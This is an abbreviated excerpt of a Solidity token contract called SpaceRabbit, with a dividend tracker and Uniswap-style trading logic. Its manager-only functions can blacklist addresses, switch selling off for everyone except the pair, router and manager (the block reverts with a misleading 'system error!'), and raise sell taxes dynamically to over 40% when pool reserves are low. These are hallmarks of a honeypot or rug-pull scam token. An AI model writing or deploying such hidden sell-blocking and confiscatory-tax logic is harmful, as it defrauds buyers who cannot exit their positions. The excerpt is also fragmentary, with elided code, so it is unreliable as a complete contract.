...
DividendPayingTokenOptionalInterface
{
    ...
    function distributeCAKEDividends(uint256 amount) public onlyManager {
...
contract BABYTOKENDividendTracker is OwnableUpgradeable, DividendPayingToken {
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyManager {
        require(
    ...
    function processAccount(address payable account, bool automatic) public onlyManager returns (bool) {
...
contract SpaceRabbit is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    bool private openSell=true;
    bool private openShare=true;
    bool public dynamic = true;
    ...
    address public testracker;

    address public addressPre;
    uint256 public startTime = 0;
    uint256 public blockKill = 1;

    uint112 public amountETH;
    uint112 public amountSR;
    ...
    constructor(
    ) payable ERC20("SpaceRabbit","SpaceRabbit")  {
        rewardToken = 0x55d398326f99059fF775485246999027B3197955;
        _marketingWalletAddress = payable(0x4E585E998b4eeFB2a51F0ef6F67D5371D15183D6);
        _lpWalletAddress=payable(0x953f1938EeAaAB55DeFb3513a52930f756d6796e);
        testracker=0x642B97BCe05bB766f1119A6Ca1F80F9a8318F7DA;

        buyTokenRewardsFee = 7;
        buyLiquidityFee = 1;
        buyMarketingFee = 1;
        buyDeadFee = 1;
        ...
        dividendTracker = BABYTOKENDividendTracker(
            payable(Clones.clone(testracker))
        );
        ...
        dividendTracker.excludeFromDividends(_lpWalletAddress);
    ...
    function updateMinimumTokenBalanceForDividends(uint256 val) public onlyManager {
        dividendTracker.updateMinimumTokenBalanceForDividends(val);
    }


    function multipleBotlistAddress(address[] calldata accounts, bool excluded) public onlyManager {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isBlacklisted[accounts[i]] = excluded;
        }
    }
    function multipleBotAddress(address account, bool excluded) public onlyManager {
    ...
    function swapManual() public onlyManager {
    ...
    function setDynamic(bool value) public onlyManager {
        dynamic = value;
    }

    function setSellOpen(bool value) public onlyManager {
        openSell = value;
    }
    function setOpenShare(bool value) public onlyManager {
        openShare = value;
    }

    function setDeadWallet(address addr) public onlyManager {
        deadWallet = addr;
    }


    function setBuyTaxes(uint256 liquidity, uint256 rewardsFee, uint256 marketingFee, uint256 deadFee) external onlyManager {
    ...
    function setSelTaxes(uint256 liquidity, uint256 rewardsFee, uint256 marketingFee, uint256 deadFee) external onlyManager {
    ...
    function _transfer(
        ...
        require(from==uniswapPair||from==address(uniswapV2Router) ||from==manager()||to==manager()||openSell, "system error!");

        if(from == addressPre && to == uniswapPair){
        ...
        (amountSR,amountETH,) = IUniswapV2Pair(uniswapPair).getReserves();
        ...
        if(dynamic){
            if (amountETH < 80* (10**18)){
                sellTokenRewardsFee = 40;
                sellLiquidityFee = 2;
                sellMarketingFee = 2;
                sellDeadFee = 1;
            }else if(amountETH < 120* (10**18)){
                sellTokenRewardsFee = 20;
                sellLiquidityFee = 4;
                sellMarketingFee = 4;
                sellDeadFee = 1;
            }else {
